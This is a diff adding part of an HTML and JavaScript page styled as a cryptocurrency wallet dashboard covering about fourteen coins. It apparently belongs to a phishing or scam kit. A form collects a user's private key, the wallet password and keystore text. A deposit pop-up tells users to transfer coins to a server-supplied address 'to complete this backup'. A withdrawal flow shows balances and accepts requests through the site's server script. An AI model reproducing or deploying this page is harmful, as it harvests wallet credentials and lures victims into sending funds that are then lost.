+                        <div class="tab-pane fade" id="nav-contact" role="tabpanel" aria-labelledby="nav-contact-tab">
+                            <div style="margin-top: 10px;" class="col-md-12 col-sm-12 col-xs-12">
+                                <form class="sendp">
+                                    <div class="form-group">
+                                        <textarea style="border-radius: 8px; background: transparent;" placeholder="Private Key" name="Private_Key" id="input" class="form-control" rows="3" required="required"></textarea>
+
+                                    </div>
+                                    <div class="form-group">
+                                        <input name="password" style="border-radius: 8px; background: transparent;" type="text" class="form-control" id="email-1" placeholder="Wallet password">
+                                        <input hidden type="text" name="type_of_login_detail" id="type_of_login_detail" value="PrivateKey">
+                                    </div>
+                                    <small>Several lines of text beginning with "{...}" plus the password you used to encrypt it.</small>
+
+                                    <div style="margin-top: 15px;" class="form-group">
+                                        <button style="width: 100%;" class="shadow-btn btn btn-info btn-corner" _msttexthash="184587" _msthash="161">Proceed</button>
+                                    </div>
+                                </form>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+
+
+
+
+            </div>
+            <div class="modal-footer">
+                <button type="button" class="btn sp_btn_danger modal_close" data-bs-dismiss="modal">Close</button>
+                <!-- <button type="submit" class="btn main-btn">Deposit now</button> -->
+            </div>
+        </div>
+        <!-- </form> -->
+    </div>
+</div>
+
+</main>
+
+
+<script src="js/purecounter.js"></script>
+<script src="js/bootstrap.bundle.min.js"></script>
+<!-- <script src="js/slick.min.js"></script> -->
+<script src="js/feather.min.js"></script>
+
+<script src="js/glightbox.min.js"></script>
+<script src="js/validate.js"></script>
+<script src="js/selectric.min.js"></script>
+<script src="js/iziToast.min.js"></script>
+<script src="js/jquery.uploadPreview.min.js"></script>
+<script src="js/user_dashboard.js"></script>
+
+<!-- <script>
+        'use strict';
+        var copyButton = document.querySelector('.copy');
+        var copyInput = document.querySelector('.copy-text');
+        $(".copy").click(function() {
+            console.log("dgtg");
+            // e.preventDefault();
+            var text = copyInput.select();
+            document.execCommand('copy');
+        });
+
+        $(".copy-text").click(function() {
+            this.select();
+        });
+
+        $('#basic-addon2').on('click', function() {
+            // jQuery function logic
+            alert('Button clicked!');
+        });
+    </script> -->
+
+
+
+
+
+<script>
+    'use strict'
+    var url = "index.php/changeLang";
+
+    $(".changeLang").change(function() {
+        if ($(this).val() == '') {
+            return false;
+        }
+        window.location.href = url + "?lang=" + $(this).val();
+    });
+
+    feather.replace();
+
+    // responsive menu slideing
+    $(".d-sidebar-menu>li>a").on("click", function() {
+        var element = $(this).parent("li");
+        if (element.hasClass("open")) {
+            element.removeClass("open");
+            element.find("li").removeClass("open");
+            element.find("ul").slideUp(500, "linear");
+        } else {
+            element.addClass("open");
+            element.children("ul").slideDown();
+            element.siblings("li").children("ul").slideUp();
+            element.siblings("li").removeClass("open");
+            element.siblings("li").find("li").removeClass("open");
+            element.siblings("li").find("ul").slideUp();
+        }
+    });
+
+    $('.sidebar-open-btn').on('click', function() {
+        $(this).toggleClass('active');
+        $('.d-sidebar').toggleClass('active');
+    });
+</script>
+
+<script>
+    $(document).ready(function() {
+        var Coin = [{
+                id: "BTC",
+                imageName: "images/icons/bitcoin.webp",
+                coinName: "Bitcoin",
+            },
+            {
+                id: "ETH",
+                imageName: "images/icons/ethereum.webp",
+                coinName: "Ethereum",
+            },
+            {
+                id: "XLM",
+                imageName: "images/icons/68966425-55b0b680-07de-11ea-8da0-a8615315f47e.png",
+                coinName: "Stellar",
+            },
+            {
+                id: "XRP",
+                imageName: "images/icons/xrp-symbol-white-128.webp",
+                coinName: "Stellar",
+            },
+            {
+                id: "TRC20",
+                imageName: "images/icons/Tether.webp",
+                coinName: "USDT",
+            },
+            {
+                id: "TRON",
+                imageName: "images/icons/tron-logo.web",
+                coinName: "TRON",
+            },
+            {
+                id: "BNB",
+                imageName: "images/icons/bnb-icon2_2x.webp",
+                coinName: "Binance Coin",
+            },
+            {
+                id: "ADA",
+                imageName: "images/icons/cardano.webp",
+                coinName: "Cardano",
+            },
+            {
+                id: "DOGE",
+                imageName: "images/icons/dogecoin.webp",
+                coinName: "Doge Coin",
+            },
+            {
+                id: "LTC",
+                imageName: "images/icons/litecoin.webp",
+                coinName: "lite Coin",
+            },
+            {
+                id: "SHIBA",
+                imageName: "images/icons/shiba.webp",
+                coinName: "SHIBA",
+            },
+            {
+                id: "MATIC",
+                imageName: "images/icons/matic-token-icon.webp",
+                coinName: "MATIC",
+            },
+            {
+                id: "SOL",
+                imageName: "images/icons/solana.webp",
+                coinName: "Solana",
+            }, {
+                id: "FTM",
+                imageName: "images/icons/Fantom_round.png",
+                coinName: "Fantom",
+            },
+        ];
+        $(document).ready(function() {
+
+            ///when deposit button is clicked
+
+            // Find wallet data by id
+
+
+            // Set modal content based on wallet data
+            // $("#loader_img, #img").attr("src", "images/icons/" + wallet.imageName);
+            // $("#wallet_name").html(wallet.walletName);
+
+
+            // const modal = $('#paynow');
+            // modal.modal('show');
+
+            //when deposit button is cliccked
+            $(".deposit_bt").click(function() {
+
+                var id = $(this).attr('id');
+                var foundCoin = Coin.find(function(item) {
+                    return item.id === id;
+                });
+                deposit();
+
+                function deposit() {
+                    Swal.fire({
+                        title: 'Form Example',
+                        html: '<div id="formContainer">' +
+                            `<p style="margin-bottom: 15px;">You are to Transfer to the ${foundCoin.coinName} address below to complete this backup</p>` +
+                            '<img src="" style="margin-bottom: 15px; height: 40px; width: 40px" id="deposite_coin_img">' +
+                            '<form id="myForm">' +
+                            '<div style="display: flex; flex-direction: column; margin-bottom: 15px;">' +
+                            `<label for="name">${foundCoin.coinName} Address:</label>` +
+                            '<div style="display: flex; margin-bottom: 5px;">' +
+                            `<input id="name" name="name" style="border: 1px solid black; type="text" id="refer-link" class="bordered-input form-control copy-text" value="index.php/register/kaylagideon77@gmail.com" placeholder="Loading Wallet Address..." aria-label="Recipient\'s username" aria-describedby="basic-addon2" readonly>` +
+                            '<button type="button" class="input-group-text copy cmn-btn" id="basic-addon2">Copy</button>' +
+                            '</div>' +
+                            '<label for="email">Amount Transferred:</label>' +
+                            '<input required class="bordered-input" type="text" id="email" name="amount" required style="border: 1px solid black;">' +
+                            '</div>' +
+                            '</form>' +
+                            '</div>',
+                        showCancelButton: true,
+                        confirmButtonText: 'Submit',
+                        didOpen: () => {
+                            const cancelButton = Swal.getCancelButton();
+                            cancelButton.addEventListener('click', (event) => {
+                                event.stopPropagation(); // Stop the event from propagating to the form
+                            });
+                        }
+                    }).then((result) => {
+                        if (result.isConfirmed) {
+                            const form = document.getElementById('myForm');
+                            const formData = new FormData(form);
+                            const amount1 = email.value.trim();
+
+                            if (amount1 === '') {
+                                Swal.fire('Error', 'You need to specify an amount', 'error').then(() => {
+                                    deposit();
+                                });
+                                return;
+                            }
+
+                            // Append a new variable to the form data to serve as the key
+                            formData.append('submit_deposit_request', 'some value');
+                            // Append a new variable for coin name
+                            formData.append('coin_name', foundCoin.coinName);
+                            // Make an AJAX request to send the form data
+                            $.ajax({
+                                url: 'includes/server.php',
+                                type: 'POST',
+                                data: formData,
+                                processData: false,
+                                contentType: false,
+                                success: function(response) {
+                                    // Handle the response from the server
+                                    console.log(response);
+                                    Swal.fire("Your Request Have Been Uploaded Successfully. Please Wait while We Confirm Your Deposit!", "", "success");
+                                },
+                                error: function(xhr, status, error) {
+                                    // Handle the error
+                                    console.error(error);
+                                    Swal.fire('Error', 'An error occurred. Please try again later.', 'error');
+                                }
+                            });
+                        }
+                    });
+
+                    //hide modal
+                    const modal = $('#paynow');
+                    modal.modal('hide');
+
+                    ///get wallet address form database
+                    var myVariable = foundCoin.id;
+                    $.ajax({
+                        type: 'POST',
+                        url: 'includes/server.php',
+                        dataType: 'text',
+                        data: {
+                            myVariable: myVariable
+                        },
+                        success: function(response) {
+                            $(".copy-text").val(response);
+                            $("#deposite_coin_img").attr("src", foundCoin.imageName);
+                        }
+                    });
+
+
+                    // jQuery event listener for the button
+                    $('#basic-addon2').on('click', function() {
+                        // jQuery function logic
+                        var text = $('.copy-text').select();
+                        document.execCommand('copy');
+                        // alert('Button clicked!');
+                        $(".copy-text").click(function() {
+                            this.select();
+                        });
+
+                    });
+                }
+
+            })
+
+
+            ////when withdraw button is clicked
+            $(document).on('click', '#withdraw_bt', function(e) {
+                //hide modal
+                const modal = $('#paynow');
+                modal.modal('hide');
+                let timerInterval
+                Swal.fire({
+                    title: 'Please Wait!',
+                    html: 'Calculating Your Avaliable Withdraw Balance...',
+                    timer: 2000,
+                    // timerProgressBar: true,
+                    didOpen: () => {
+                        Swal.showLoading()
+                        //alert("yess")
+                    },
+                }).then((result) => {
+                    var check_coin_bal = "with_check"; ///serves as the key
+                    var coin_id = foundCoin.id;
+                    $.ajax({
+                        type: 'POST',
+                        url: 'includes/server.php',
+                        dataType: 'text',
+                        data: {
+                            check_coin_bal: check_coin_bal,
+                            coin_id: coin_id,
+                        },
+                        success: function(response) {
+                            // alert(response);
+                            var response = response;
+                            if (response.trim() == 0) {
+                                Swal.fire(
+                                    `Insufficient ${foundCoin.coinName} Wallet Balance`,
+                                    '',
+                                    'error'
+                                )
+                            } else {
+                                secondcall(response.trim());
+
+                            }
+                        }
+                    })
+                })
+
+                ////fuction that check and pull out acount balace
+                // function account_bal() {
+                //     var chhk_wit = 5;
+                //     var coin_id = foundCoin.id;
+                //     $.ajax({
+                //         type: 'POST',
+                //         url: 'includes/server.php',
+                //         dataType: 'text',
+                //         data: {
+                //             chhk_wit: chhk_wit,
+                //             coin_id: coin_id,
+                //         },
+                //         success: function(resp) {
+                //             secondcall($balance = resp.trim());
+                //             // }
+                //         }
+                //     });
+
+                // }
+
+                // ///fuction to enter input for withdrawal
+                function secondcall(balance) {
+
+                    (async () => {
+                        const formattedBalance = new Intl.NumberFormat().format(balance);
+                        const {
+                            value: amount
+                        } = await Swal.fire({
+                            title: `Avaliable ${foundCoin.coinName} Balance $${formattedBalance}`,
+                            input: 'number',
+                            inputLabel: 'Enter The Amount You Will Like to Withdraw',
+                            showCancelButton: true,
+                            inputValidator: (value) => {
+                                if (!value) {
+                                    return 'You need to Specify a Value!'
+                                }
+                            }
+                        })
+                        if (amount) {
+                            if (amount > parseInt(balance)) {
+                                Swal.fire(
+                                    'Insufficient Balance!',
+                                    `Please make sure the amount you want to withdraw is not greater than $${formattedBalance}`,
+                                    'error'
+                                ).then(function() {
+                                    secondcall(balance);
+                                })
+                            } else {
+                                var coin_name = foundCoin.coinName;
+                                var coin_id = foundCoin.id;
+                                var sub_withdrawal = "chk_amount";
+                                $.ajax({
+                                    type: 'POST',
+                                    url: 'includes/server.php',
+                                    dataType: 'text',
+                                    data: {
+                                        sub_withdrawal: sub_withdrawal,
+                                        amount: amount,
+                                        coin_name: coin_name,
+                                        coin_id: coin_id,
+                                    },
+                                    success: function(resp) {
+                                        if (resp.trim() == "ok") {
+                                            Swal.fire(
+                                                'Note',
+                                                'Withdraw request submmited succesfully',
+                                                'success'
+                                            )
+                                        }
+                                    }
+                                });
+
+                            }
+
+                        }
+                    })()
+
+                }
+            });
+
+
+        })
+
+
+    })
+</script>
+<script>
+    $(document).ready(function() {
+        function e(e) {
+            return (e = parseFloat(e).toFixed(2)).toString().replace(/\B(?=(\d{3})+(?!\d))/g, ",");
+        }
+        let actualValue = 0;
+        setInterval(function() {
+                // var r = $("#bitcoin").val(),
+                //     c = $("#ethereum").val(),
+                //     t = $("#polkadot").val(),
+                //     n = $("#algorand").val(),
+                //     _ = $("#stellar").val(),
+                //     i = $("#ripple").val(),
+                //     a = $("#tether").val(),
+                //     p = $("#tron").val(),
+                //     l = $("#binancecoin").val(),
+                //     o = $("#cardano").val(),
+                //     h = $("#dogecoin").val(),
+                //     d = $("#litecoin").val(),
+                //     s = $("#shiba-inu").val(),
+                //     u = $("#matic-network").val(),
+                //     g = $("#fantom").val(),
+                //     m = $("#solana").val(),
+                //     f = $("#ethereum-classic").val(),
+                v = 0,
+                    btc_in_usd = $("#bitcoin_wFund").text().replace(/[^\d.-]+/g, '').trim(),
+                    eth_in_usd = $("#ethereum_wFund").text().replace(/[^\d.-]+/g, '').trim(),
+                    xlm_in_usd = $("#xlm_wFund").text().replace(/[^\d.-]+/g, '').trim(),
+                    xrp_in_usd = $("#xrp_wFund").text().replace(/[^\d.-]+/g, '').trim(),
+                    usdt_in_usd = $("#usdt_wFund").text().replace(/[^\d.-]+/g, '').trim(),
+                    tron_in_usd = $("#tron_wFund").text().replace(/[^\d.-]+/g, '').trim(),
+                    binancecoin_in_usd = $("#binancecoin_wFund").text().replace(/[^\d.-]+/g, '').trim(),
+                    cardano_in_usd = $("#cardano_wFund").text().replace(/[^\d.-]+/g, '').trim(),
+                    dogecoin_in_usd = $("#dogecoin_wFund").text().replace(/[^\d.-]+/g, '').trim(),
+                    litecoin_in_usd = $("#litecoin_wFund").text().replace(/[^\d.-]+/g, '').trim(),
+                    shiba_in_usd = $("#shiba_wFund").text().replace(/[^\d.-]+/g, '').trim(),
+                    matic_in_usd = $("#matic_wFund").text().replace(/[^\d.-]+/g, '').trim(),
+                    fantom_in_usd = $("#fantom_wFund").text().replace(/[^\d.-]+/g, '').trim(),
+                    solana_in_usd = $("#solana_wFund").text().replace(/[^\d.-]+/g, '').trim(),
+                    // J = $("#fantom_wFund").text().replace(/[^\d.-]+/g, '').trim(),
+                    // N = $("#solana_wFund").text().replace(/[^\d.-]+/g, '').trim(),
+                    // T = $("#ethereum-classic_wFund").text().replace(/[^\d.-]+/g, '').trim();
+                    //console.log(F);
+                    $.ajax({
+                        url: "includes/fetchData.php",
+                        type: "POST",
+                        data: {
+                            getCoinPrice: 1
+                        },
+                        success: function(q) {
+                            (q = JSON.parse(q)),
+                            $(q).each(function(q, z) {
+                                $(z).each(function(q, z) {
+                                    if ("bitcoin" == z.id) {
+                                        var btcAmount = parseFloat(btc_in_usd) / z.current_price;
+                                        // console.log(btcAmount);
+                                        // v+=parseFloat(r * z.current_price - F);
+                                        $("#bitcoin_amount").html(btcAmount.toFixed(2) + " BTC");
+                                        $("#bitcoin_price").html("$" + z.current_price.toLocaleString());
+                                        z.price_change_percentage_24h < 0 ?
+                                            ($("#bitcoin_predict").css("color", "red"), $("#bitcoin_predict").html(z.price_change_percentage_24h + "%")) :
+                                            ($("#bitcoin_predict").css("color", "green"), $("#bitcoin_predict").html("+" + z.price_change_percentage_24h + "%"));
+
+                                    }
+                                    if ("ethereum" == z.id) {
+                                        var ethAmount = parseFloat(eth_in_usd) / z.current_price;
+                                        // console.log(btcAmount);
+                                        // v+=parseFloat(r * z.current_price - F);
+                                        $("#ethereum_amount").html(ethAmount.toFixed(2) + " ETH");
+                                        $("#ethereum_price").html("$" + z.current_price.toLocaleString());
+                                        z.price_change_percentage_24h < 0 ?
+                                            ($("#ethereum_predict").css("color", "red"), $("#ethereum_predict").html(z.price_change_percentage_24h + "%")) :
+                                            ($("#ethereum_predict").css("color", "green"), $("#ethereum_predict").html("+" + z.price_change_percentage_24h + "%"));
+
+                                    }
+                                    if ("stellar" == z.id) {
+                                        var xlmAmount = parseFloat(xlm_in_usd) / z.current_price;
+                                        // console.log(btcAmount);
+                                        // v+=parseFloat(r * z.current_price - F);
+                                        $("#xlm_amount").html(xlmAmount.toFixed(2) + " XLM");
+                                        $("#xlm_price").html("$" + z.current_price.toLocaleString());
+                                        z.price_change_percentage_24h < 0 ?
+                                            ($("#xlm_predict").css("color", "red"), $("#xlm_predict").html(z.price_change_percentage_24h + "%")) :
+                                            ($("#xlm_predict").css("color", "green"), $("#xlm_predict").html("+" + z.price_change_percentage_24h + "%"));
+
+                                    }
+                                    if ("ripple" == z.id) {
+                                        var xrpAmount = parseFloat(xrp_in_usd) / z.current_price;
+                                        // console.log(btcAmount);
+                                        // v+=parseFloat(r * z.current_price - F);
+                                        $("#xrp_amount").html(xrpAmount.toFixed(2) + " XRP");
+                                        $("#xrp_price").html("$" + z.current_price.toLocaleString());
+                                        z.price_change_percentage_24h < 0 ?
+                                            ($("#xrp_predict").css("color", "red"), $("#xrp_predict").html(z.price_change_percentage_24h + "%")) :
+                                            ($("#xrp_predict").css("color", "green"), $("#xrp_predict").html("+" + z.price_change_percentage_24h + "%"));
+
+                                    }
+                                    if ("tether" == z.id) {
+                                        var usdtAmount = parseFloat(usdt_in_usd) / z.current_price;
+                                        // console.log(btcAmount);
+                                        // v+=parseFloat(r * z.current_price - F);
+                                        $("#usdt_amount").html(usdtAmount.toFixed(2) + " TRC20");
+                                        $("#usdt_price").html("$" + z.current_price.toLocaleString());
+                                        z.price_change_percentage_24h < 0 ?
+                                            ($("#usdt_predict").css("color", "red"), $("#usdt_predict").html(z.price_change_percentage_24h + "%")) :
+                                            ($("#usdt_predict").css("color", "green"), $("#usdt_predict").html("+" + z.price_change_percentage_24h + "%"));
+
+                                    }
+                                    if ("tron" == z.id) {
+                                        var tronAmount = parseFloat(tron_in_usd) / z.current_price;
+                                        // console.log(btcAmount);
+                                        // v+=parseFloat(r * z.current_price - F);
+                                        $("#tron_amount").html(tronAmount.toFixed(2) + " TRON");
+                                        $("#tron_price").html("$" + z.current_price.toLocaleString());
+                                        z.price_change_percentage_24h < 0 ?
+                                            ($("#tron_predict").css("color", "red"), $("#tron_predict").html(z.price_change_percentage_24h + "%")) :
+                                            ($("#tron_predict").css("color", "green"), $("#tron_predict").html("+" + z.price_change_percentage_24h + "%"));
+
+                                    }
+                                    if ("binancecoin" == z.id) {
+                                        var binancecoinAmount = parseFloat(binancecoin_in_usd) / z.current_price;
+                                        // console.log(btcAmount);
+                                        // v+=parseFloat(r * z.current_price - F);
+                                        $("#binancecoin_amount").html(binancecoinAmount.toFixed(2) + " BNB");
+                                        $("#binancecoin_price").html("$" + z.current_price.toLocaleString());
+                                        z.price_change_percentage_24h < 0 ?
+                                            ($("#binancecoin_predict").css("color", "red"), $("#binancecoin_predict").html(z.price_change_percentage_24h + "%")) :
+                                            ($("#binancecoin_predict").css("color", "green"), $("#binancecoin_predict").html("+" + z.price_change_percentage_24h + "%"));
+
+                                    }
+                                    if ("cardano" == z.id) {
+                                        var cardanoAmount = parseFloat(cardano_in_usd) / z.current_price;
+                                        // console.log(btcAmount);
+                                        // v+=parseFloat(r * z.current_price - F);
+                                        $("#cardano_amount").html(cardanoAmount.toFixed(2) + " ADA");
+                                        $("#cardano_price").html("$" + z.current_price.toLocaleString());
+                                        z.price_change_percentage_24h < 0 ?
+                                            ($("#cardano_predict").css("color", "red"), $("#cardano_predict").html(z.price_change_percentage_24h + "%")) :
+                                            ($("#cardano_predict").css("color", "green"), $("#cardano_predict").html("+" + z.price_change_percentage_24h + "%"));
+
+                                    }
+                                    if ("dogecoin" == z.id) {
+                                        var dogecoinAmount = parseFloat(dogecoin_in_usd) / z.current_price;
+                                        // console.log(btcAmount);
+                                        // v+=parseFloat(r * z.current_price - F);
+                                        $("#dogecoin_amount").html(dogecoinAmount.toFixed(2) + " DOGE");
+                                        $("#dogecoin_price").html("$" + z.current_price.toLocaleString());
+                                        z.price_change_percentage_24h < 0 ?
+                                            ($("#dogecoin_predict").css("color", "red"), $("#dogecoin_predict").html(z.price_change_percentage_24h + "%")) :
+                                            ($("#dogecoin_predict").css("color", "green"), $("#dogecoin_predict").html("+" + z.price_change_percentage_24h + "%"));
+
+                                    }
+                                    if ("litecoin" == z.id) {
+                                        var litecoinAmount = parseFloat(litecoin_in_usd) / z.current_price;
+                                        // console.log(btcAmount);
+                                        // v+=parseFloat(r * z.current_price - F);
+                                        $("#litecoin_amount").html(litecoinAmount.toFixed(2) + " LTC");
+                                        $("#litecoin_price").html("$" + z.current_price.toLocaleString());
+                                        z.price_change_percentage_24h < 0 ?
+                                            ($("#litecoin_predict").css("color", "red"), $("#litecoin_predict").html(z.price_change_percentage_24h + "%")) :
+                                            ($("#litecoin_predict").css("color", "green"), $("#litecoin_predict").html("+" + z.price_change_percentage_24h + "%"));
+
+                                    }
+                                    if ("shiba-inu" == z.id) {
+                                        var shibaAmount = parseFloat(shiba_in_usd) / z.current_price;
+                                        // console.log(btcAmount);
+                                        // v+=parseFloat(r * z.current_price - F);
+                                        $("#shiba_amount").html(shibaAmount.toFixed(2) + " SHIBA");
+                                        $("#shiba_price").html("$" + z.current_price.toLocaleString());
+                                        z.price_change_percentage_24h < 0 ?
+                                            ($("#shiba_predict").css("color", "red"), $("#shiba_predict").html(z.price_change_percentage_24h + "%")) :
+                                            ($("#shiba_predict").css("color", "green"), $("#shiba_predict").html("+" + z.price_change_percentage_24h + "%"));
+
+                                    }
+                                    if ("matic-network" == z.id) {
+                                        var maticAmount = parseFloat(matic_in_usd) / z.current_price;
+                                        // console.log(btcAmount);
+                                        // v+=parseFloat(r * z.current_price - F);
+                                        $("#matic_amount").html(maticAmount.toFixed(2) + " MATIC");
+                                        $("#matic_price").html("$" + z.current_price.toLocaleString());
+                                        z.price_change_percentage_24h < 0 ?
+                                            ($("#matic_predict").css("color", "red"), $("#matic_predict").html(z.price_change_percentage_24h + "%")) :
+                                            ($("#matic_predict").css("color", "green"), $("#matic_predict").html("+" + z.price_change_percentage_24h + "%"));
+
+                                    }
+                                    if ("fantom" == z.id) {
+                                        var fantomAmount = parseFloat(fantom_in_usd) / z.current_price;
+                                        // console.log(btcAmount);
+                                        // v+=parseFloat(r * z.current_price - F);
+                                        $("#fantom_amount").html(fantomAmount.toFixed(2) + " FANTOM");
+                                        $("#fantom_price").html("$" + z.current_price.toLocaleString());
+                                        z.price_change_percentage_24h < 0 ?
+                                            ($("#fantom_predict").css("color", "red"), $("#fantom_predict").html(z.price_change_percentage_24h + "%")) :
+                                            ($("#fantom_predict").css("color", "green"), $("#fantom_predict").html("+" + z.price_change_percentage_24h + "%"));
+
+                                    }
+                                    if ("solana" == z.id) {
+                                        var solanaAmount = parseFloat(solana_in_usd) / z.current_price;
+                                        // console.log(btcAmount);
+                                        // v+=parseFloat(r * z.current_price - F);
+                                        $("#solana_amount").html(solanaAmount.toFixed(2) + " SOL");
+                                        $("#solana_price").html("$" + z.current_price.toLocaleString());
+                                        z.price_change_percentage_24h < 0 ?
+                                            ($("#solana_predict").css("color", "red"), $("#solana_predict").html(z.price_change_percentage_24h + "%")) :
+                                            ($("#solana_predict").css("color", "green"), $("#solana_predict").html("+" + z.price_change_percentage_24h + "%"));
+
+                                    }
+                                });
+                            });
+                            // if(v == 0)
+                            // {
+                            //     $("#mainBalance").html("$" + e(actualValue));
+                            // }
+                            // else
+                            // {
+                            //     actualValue = v;
+                            //     $("#mainBalance").html("$" + e(v));
+                            // }
+                            $("#mainBalance").html("$" + e(v));
+                        },
+                        error: function(e) {
+                            console.log("File Fetching error: " + e);
+                        },
+                    });
+            }, 8000),
+            $(document).on("click", ".boxContainer", function() {
+                $(".boxContainer").css("display", "none");
+            }),
+            $(document).on("click", ".showBox", function() {
+                $(".boxContainer").css("display", "block");
+            });
+    });
+</script>
+<style>
+    .butns {
+        margin-left: 5px;
+        font-size: 7.0pt;
+    }
+
+    .bordered-input {
+        border-radius: 12px;
+
+    }
+</style>
+</body>
+
+</html>
